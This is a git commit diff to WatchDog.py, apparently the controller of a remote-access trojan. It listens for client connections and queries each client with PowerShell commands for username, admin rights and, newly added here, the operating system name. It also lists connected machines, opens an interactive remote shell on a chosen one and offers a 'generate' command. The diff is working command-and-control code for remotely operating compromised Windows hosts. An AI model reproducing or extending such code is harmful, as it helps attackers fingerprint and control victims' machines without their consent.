c57b941dfae38719e981bd04cbe95cc38d717fe0
llc1234 <93080319+llc1234@users.noreply.github.com>
2024-01-22 01:01:53 +0100

    Update WatchDog.py

--- WatchDog.py
+++ WatchDog.py
@@ -62,6 +62,12 @@ class WatchDog:
         rm = conn.recv(16).decode("utf-8")
 
         return rm[0:-2]
+    
+    def cmd_OS_name(self, conn):
+        conn.send(bytes("$osInfo = Get-CimInstance Win32_OperatingSystem; $osInfo.Caption", "utf-8"))
+        rm = conn.recv(32).decode("utf-8")
+
+        return rm[0:-2]
 
     def test_connections(self):
         while self.running:
@@ -70,7 +76,7 @@ class WatchDog:
                 if not pp[4]:
                     if not self.cmd_WhoAmI(pp[0]):
                         print('\r' + ' ' * 30 + '\r', end='', flush=True)
-                        print(f"{colorama.Fore.RED}[-] {colorama.Fore.LIGHTMAGENTA_EX}client has disconnected IP:{pp[1]}, User: {pp[2]}, Admin: {pp[3]}{colorama.Fore.LIGHTBLUE_EX}")
+                        print(f"{colorama.Fore.RED}[-] {colorama.Fore.LIGHTMAGENTA_EX}client has disconnected IP:{pp[1]}, User: {pp[2]}, Admin: {pp[3]}, OS: {pp[4]}{colorama.Fore.LIGHTBLUE_EX}")
                         print(self.WatchDog_Input_Text, end='', flush=True)
                         self.data_clients.remove(pp)
 
@@ -83,11 +89,12 @@ class WatchDog:
 
                     User_name = self.cmd_WhoAmI(conn)
                     Check_Privileges = self.cmd_Check_Privileges(conn)
+                    name_os = self.cmd_OS_name(conn)
 
-                    print(f"{colorama.Fore.GREEN}[+] {colorama.Fore.LIGHTMAGENTA_EX}Client connected IP: {addr[0]}, User: {User_name}, Admin: {Check_Privileges}{colorama.Fore.LIGHTBLUE_EX}")
+                    print(f"{colorama.Fore.GREEN}[+] {colorama.Fore.LIGHTMAGENTA_EX}Client connected IP: {addr[0]}, User: {User_name}, Admin: {Check_Privileges} OS: {name_os}{colorama.Fore.LIGHTBLUE_EX}")
                     print(self.WatchDog_Input_Text, end='', flush=True)
 
-                    self.data_clients.append([conn, addr[0], User_name, Check_Privileges, False])
+                    self.data_clients.append([conn, addr[0], User_name, Check_Privileges, name_os])
 
                 except socket.timeout:
                     pass
@@ -98,7 +105,7 @@ class WatchDog:
         client_number = 0
         print("")
         for pp in self.data_clients:
-            print(f"Client {client_number} connected IP: {pp[1]}, User: {pp[2]}, Admin: {pp[3]}")
+            print(f"{colorama.Fore.LIGHTMAGENTA_EX}Client {client_number} connected IP: {pp[1]}, User: {pp[2]}, Admin: {pp[3]} OS: {pp[4]}")
             client_number += 1
         print("")
 
@@ -129,6 +136,9 @@ class WatchDog:
                     print("Exit Shell...")
                     print("")
                     break
+                elif co == "clear":
+                    os.system("cls")
+                    continue
 
                 self.data_clients[client_number][0].send(bytes(co, "utf-8"))
                 self.data_clients[client_number][0].settimeout(0.8)
@@ -186,12 +196,13 @@ class WatchDog:
                 print("shell <client's number>")
                 print("")
                 print("")
-
             elif command[0] == "exit":
                 print("")
                 print("Closing Server...")
                 print("")
                 break
+            elif command[0] == "clear":
+                os.system("cls")
             elif command[0] == "generate":
                 self.set_generate(self.splitlist(command))
             elif command[0] == "server":
